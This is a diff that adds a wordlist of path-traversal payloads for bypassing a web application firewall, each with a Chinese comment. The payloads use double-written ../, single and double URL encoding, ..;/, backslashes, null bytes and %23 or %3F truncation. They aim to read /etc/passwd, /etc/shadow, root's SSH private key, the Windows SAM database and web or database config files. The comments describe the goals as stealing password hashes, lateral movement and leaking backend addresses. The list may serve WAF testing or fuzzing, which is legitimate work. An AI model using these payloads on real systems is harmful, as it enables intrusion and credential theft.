@@ -1,0 +1,22 @@
+# WAF 路径绕过 - 双写 ../ 读取 /etc/passwd 获取系统用户
+....//....//....//etc/passwd
+# WAF 路径绕过 - URL 编码 ../ 读取 /etc/shadow 密码哈希
+%2e%2e/%2e%2e/%2e%2e/etc/shadow
+# WAF 路径绕过 - 双 URL 编码读取 root SSH 私钥横向移动
+%252e%252e%252f%252e%252e%252f%252e%252e%252froot%252f.ssh%252fid_rsa
+# WAF 路径绕过 - ..;/ 分号截断读取 Nginx 配置泄露后端地址
+..;/..;/..;/etc/nginx/sites-enabled/default
+# WAF 路径绕过 - 反斜杠绕过读取 Windows SAM 密码数据库
+..\..\..\windows\system32\config\SAM
+# WAF 路径绕过 - 绝对路径 /../ 读取 /etc/shadow
+/../../../../etc/shadow
+# WAF 路径绕过 - 空字节截断 .html 后缀读取 passwd
+../../../etc/passwd%00.html
+# WAF 路径绕过 - 路径填充 ./ 绕过深度限制读取 MySQL 配置
+../../../etc/mysql/my.cnf/./././././.
+# WAF 路径绕过 - %23 注释截断读取 SSH 私钥
+../../../root/.ssh/id_rsa%23
+# WAF 路径绕过 - %3F 问号截断读取数据库配置文件
+../../../var/www/html/config/database.php%3F
+# WAF 路径绕过 - 双重 URL 编码空字节截断读取 passwd
+../../../etc/passwd%2500.html
